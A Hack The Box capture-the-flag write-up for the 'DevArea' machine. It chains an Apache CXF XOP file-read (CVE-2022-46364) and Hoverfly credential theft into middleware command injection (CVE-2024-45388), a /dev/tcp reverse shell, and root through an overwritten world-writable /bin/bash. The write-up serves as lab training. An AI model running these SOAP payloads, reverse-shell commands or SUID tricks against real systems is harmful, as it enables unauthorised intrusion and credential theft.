# HTB Writeup — DevArea

- **IP:** `10.129.22.15`
- **Domain:** `devarea.htb`
- **OS:** Linux (Ubuntu)
- **Difficulty:** Medium

---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [FTP Access & JAR Analysis](#2-ftp-access--jar-analysis)
3. [SSRF/LFI via Apache CXF](#3-ssrflfi-via-apache-cxf)
4. [Extracting Hoverfly Credentials](#4-extracting-hoverfly-credentials)
5. [Hoverfly API & JWT Authentication](#5-hoverfly-api--jwt-authentication)
6. [Command Injection via Middleware](#6-command-injection-via-middleware)
7. [Reverse Shell & User Flag](#7-reverse-shell--user-flag)
8. [Privilege Escalation via syswatch & World-Writable Bash](#8-privilege-escalation-via-syswatch--world-writable-bash)
9. [Root Flag](#9-root-flag)

---

## 1. Enumeration

### Adding the Host

```bash
echo "10.129.22.15 devarea.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.129.22.15
```

**Results:**

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.5
7777/tcp open  cbt?
8080/tcp open  http-proxy Apache CXF (Jetty)
8500/tcp open  http-proxy Hoverfly proxy listener
8888/tcp open  http       Hoverfly web dashboard
```

| Port | Service | Notes |
|------|---------|-------|
| 21/tcp | FTP | Anonymous login allowed |
| 8080/tcp | HTTP | Apache CXF SOAP service |
| 8500/tcp | HTTP | Hoverfly proxy |
| 8888/tcp | HTTP | Hoverfly admin API/dashboard |

Four interesting ports stand out immediately. FTP allows anonymous access, and two distinct Hoverfly ports (proxy listener and admin dashboard) sit alongside an Apache CXF SOAP endpoint — a combination that screams attack surface.

---

## 2. FTP Access & JAR Analysis

### Anonymous FTP Login

```bash
ftp 10.129.22.15
# Username: anonymous
# Password: (blank)
```

Inside `/pub`, we find `employee-service.jar`. Download it:

```bash
get employee-service.jar
quit
```

### Decompiling the JAR

```bash
jadx employee-service.jar -d decompiled/
```

Inspecting the decompiled source, we find the SOAP service endpoint at `http://10.129.22.15:8080/employeeservice?wsdl`. The `submitReport` function accepts a `content` field that is passed directly into an XOP (XML-binary Optimized Packaging) handler — and crucially, it supports `file://` URIs via `<xop:Include href="...">`, giving us SSRF/LFI.

---

## 3. SSRF/LFI via Apache CXF

The endpoint is vulnerable to **CVE-2022-46364**. We craft a multipart SOAP request containing an `<xop:Include href="file://...">` element to read arbitrary local files. The file contents are returned base64-encoded in the SOAP response.

### Proof of Concept — Reading `/etc/passwd`

```bash
curl -X POST http://10.129.22.15:8080/employeeservice \
  -H "Content-Type: multipart/related; boundary=\"MIME_boundary\"; type=\"application/xop+xml\"; start=\"<root.message@cxf.apache.org>\"" \
  --data-binary @- << 'EOF'
--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: binary
Content-ID: <root.message@cxf.apache.org>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://devarea.htb/">
    <soap:Body>
        <ns:submitReport>
            <arg0>
                <confidential>false</confidential>
                <content>
                    <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
                                 href="file:///etc/passwd"/>
                </content>
                <department>IT</department>
                <employeeName>test</employeeName>
            </arg0>
        </ns:submitReport>
    </soap:Body>
</soap:Envelope>
--MIME_boundary--
EOF
```

Decoding the base64 response reveals the passwd file, including two non-root users: `dev_ryan` and `syswatch`.

---

## 4. Extracting Hoverfly Credentials

Using the same SSRF primitive, we read the Hoverfly systemd service file:

```bash
curl -X POST http://10.129.22.15:8080/employeeservice \
  -H "Content-Type: multipart/related; boundary=\"MIME_boundary\"; type=\"application/xop+xml\"; start=\"<root.message@cxf.apache.org>\"" \
  --data-binary @- << 'EOF'
--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: binary
Content-ID: <root.message@cxf.apache.org>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://devarea.htb/">
    <soap:Body>
        <ns:submitReport>
            <arg0>
                <confidential>false</confidential>
                <content>
                    <xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include"
                                 href="file:///etc/systemd/system/hoverfly.service"/>
                </content>
                <department>IT</department>
                <employeeName>test</employeeName>
            </arg0>
        </ns:submitReport>
    </soap:Body>
</soap:Envelope>
--MIME_boundary--
EOF
```

Decoding the base64 response reveals the service definition:

```
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password <password> -listen-on-host 0.0.0.0
...
```

**Credentials recovered:** `admin:<password>`

---

## 5. Hoverfly API & JWT Authentication

### Obtaining a JWT Token

```bash
curl -X POST http://10.129.22.15:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":<password>}'
```

**Response:**

```json
{
  "token": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxMDM1MzcsImlhdCI6MTc3NTA2MzUzNywic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9._U0K2QVRxLLdmjtimBKFuqK0GJhlgdHUblS4Eh97WMcLEnXuKwCVDe0yGmP5L_ABWgHH2cXHbM_rIpEDnvtJaw"
}
```

This JWT is used to authenticate all subsequent Hoverfly admin API requests.

---

## 6. Command Injection via Middleware

The Hoverfly admin API endpoint `/api/v2/hoverfly/middleware` (**CVE-2024-45388**) allows an authenticated user to configure an arbitrary binary and script to execute as middleware — meaning any request proxied through Hoverfly on port 8500 triggers our payload.

### Setting the Reverse Shell Middleware

```bash
curl -X PUT http://10.129.22.15:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"binary":"/bin/sh","script":"sh -i >& /dev/tcp/10.10.15.15/4444 0>&1","remote":""}'
```

### Triggering the Middleware

With a listener running, sending any request through the Hoverfly proxy port fires the payload:

```bash
curl -x http://10.129.22.15:8500 http://example.com
```

---

## 7. Reverse Shell & User Flag

### Start Listener

```bash
nc -lvnp 4444
```

After triggering the middleware, a shell arrives as `dev_ryan`:

```bash
id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

### User Flag

```bash
cat /home/dev_ryan/user.txt
```

```
flag1
```

---

## 8. Privilege Escalation via syswatch & World-Writable Bash

### Sudo Check

```bash
sudo -l
```

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh
```

### Spotting the Misconfiguration

```bash
ls -la /bin/bash
```

```
-rwxrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
```

`/bin/bash` is **world-writable**. Since `syswatch.sh` runs as root and invokes bash, we can replace the binary with a script that creates a SUID root shell, then trigger it via sudo.

### Exploit Sequence

We switch to `sh` first to avoid killing our own shell when bash is overwritten:

```sh
cp /bin/bash /tmp/bash.bak
chmod +x /tmp/bash.bak
pkill -9 bash
sleep 1
cat > /bin/bash << 'EOF'
#!/tmp/bash.bak
cp /tmp/bash.bak /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
sudo /opt/syswatch/syswatch.sh --version
/tmp/rootbash -p
```

When `syswatch.sh` runs as root it invokes our fake `/bin/bash`, which copies the real bash to `/tmp/rootbash` and sets the SUID bit. We then execute it with `-p` to preserve the elevated UID.

```
id
uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) groups=1001(dev_ryan)
```

Root shell obtained.

---

## 9. Root Flag

```bash
cat /root/root.txt
```

```
flag2
```

---

## Attack Chain Summary

```
FTP anonymous login → employee-service.jar
        ↓
Decompile JAR (jadx) → identify SOAP endpoint + XOP/file:// handling
        ↓
SSRF/LFI via Apache CXF (CVE-2022-46364)
→ read /etc/passwd → users: dev_ryan, syswatch
→ read /etc/systemd/system/hoverfly.service → admin:<password>
        ↓
JWT token from Hoverfly API (POST /api/token-auth)
        ↓
Command injection via /api/v2/hoverfly/middleware (CVE-2024-45388)
→ reverse shell triggered through port 8500 proxy
        ↓
Shell as dev_ryan
        ↓
sudo -l → NOPASSWD: /opt/syswatch/syswatch.sh
+ /bin/bash world-writable
        ↓
Replace /bin/bash with SUID root shell creator
→ sudo syswatch.sh → /tmp/rootbash -p
        ↓
cat /root/root.txt → Root Flag
```
